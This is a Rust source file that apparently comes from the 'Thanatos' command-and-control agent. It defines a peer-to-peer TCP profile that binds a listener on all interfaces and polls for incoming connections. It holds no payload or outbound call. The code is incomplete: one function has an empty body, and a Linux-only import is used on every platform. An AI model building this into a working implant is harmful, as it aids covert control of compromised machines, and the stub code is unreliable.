use agent_utils::errors::{ProfileInternalError, ThanatosError};
use base_traits::p2p::{IOHandle, P2PProfile, PollReader, ReadWritePoll};
use std::net::{TcpListener, TcpStream};

#[cfg(target_os = "windows")]
mod windows;

#[cfg(target_os = "linux")]
mod linux;

#[cfg(target_os = "linux")]
use linux::poll_timeout;

#[derive(Debug)]
pub struct TcpProfile {
    listener: TcpListener,
    stream: Option<TcpStream>,
}

impl TcpProfile {
    pub fn new() -> Result<Self, ThanatosError> {
        let listener = agent_utils::debug_invoke!(
            TcpListener::bind(format!("0.0.0.0:{}", config::tcp::bind_port())),
            ThanatosError::ProfileError(ProfileInternalError::Fatal)
        );

        agent_utils::debug_invoke!(
            listener.set_nonblocking(true),
            ThanatosError::ProfileError(ProfileInternalError::Fatal)
        );

        Ok(Self {
            listener,
            stream: None,
        })
    }
}

impl P2PProfile<TcpStream> for TcpProfile {
    fn poll_connection(
        &mut self,
        timeout: std::time::Duration,
    ) -> Result<IOHandle<TcpStream>, ThanatosError> {
        poll_timeout(&mut self.listener, timeout).map(|v| v.into())
    }
}

impl PollReader for TcpStream {
    fn check_readable(&mut self, timeout: std::time::Duration) -> bool {}
}
